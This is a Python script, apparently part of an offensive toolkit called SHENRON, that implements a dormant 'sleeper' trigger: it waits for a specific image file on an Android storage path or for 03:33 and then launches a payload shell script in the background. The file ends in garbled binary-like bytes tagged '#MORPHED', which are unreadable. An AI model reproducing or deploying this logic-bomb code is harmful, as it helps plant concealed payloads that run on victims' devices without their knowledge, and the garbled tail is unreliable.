from core.engine.payload_registry import register_payload

#!/usr/bin/env python3
# dormant_sleeper_seed.py - SHENRON latent payload trigger system

import os
import time
import hashlib
from datetime import datetime

SLEEPER_LOG = os.path.expanduser("~/SHENRON/logs/sleeper_status.log")
TRIGGER_FILE = "/sdcard/DCIM/trigger.jpg"
TRIGGER_HASH = "badc0ffee"
TRIGGER_TIME = "03:33"

def log_event(msg):
    with open(SLEEPER_LOG, "a") as f:
        f.write(f"[{datetime.now()}] {msg}\n")

def file_trigger():
    if os.path.exists(TRIGGER_FILE):
        with open(TRIGGER_FILE, "rb") as f:
            data = f.read()
            if hashlib.md5(data).hexdigest()[:9] == TRIGGER_HASH:
                return True
    return False

def time_trigger():
    return datetime.now().strftime("%H:%M") == TRIGGER_TIME

@register_payload(name="dormant_sleeper_seed_lpOMpH_2o4ZmC_0ZK3R9_vJaE8K")
def main():
    log_event("Sleeper seed is armed and waiting.")
    while True:
        if file_trigger():
            log_event("File-based trigger activated.")
            os.system("sh ~/SHENRON/core/autonomy/execute_payloads.sh &")
            break
        if time_trigger():
            log_event("Time-based trigger activated.")
            os.system("sh ~/SHENRON/core/autonomy/execute_payloads.sh &")
            break
        time.sleep(30)

if __name__ == "__main__":
    main()

нcч
јxЩґФЁЭ,W•:эsA/8Ж‰Ъ(’ґЭ(FЕE{=бЁП#MORPHED

В‹Ђє:—:WtџО—›Ѓ‰0#MORPHED

мЉчgf—!3¶>Ђl	“#MORPHED

К‡Tр(rЩ*Б(н:МћiqйјМ•МsЃsEЁхаЃҐ~з¦m€
#MORPHED
